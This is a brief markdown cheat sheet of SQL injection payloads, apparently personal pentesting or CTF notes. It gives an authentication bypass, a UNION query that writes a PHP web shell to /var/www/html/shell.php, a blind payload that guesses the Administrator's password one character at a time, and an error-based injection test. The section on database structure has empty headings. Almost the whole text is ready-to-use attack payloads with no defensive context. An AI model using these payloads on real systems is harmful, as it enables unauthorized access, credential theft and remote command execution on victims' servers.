# SQLi payloads
`' OR 1=1--`


## File write:
`' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL,NULL into outfile '/var/www/html/shell.php'-- -`

## Guessing characters one at a time
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm`

## Exfiltrating database structure
> Sqlite:

> MySQL:

## Error based SQLi
`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a' -- `
If 1=1, this will throw an error.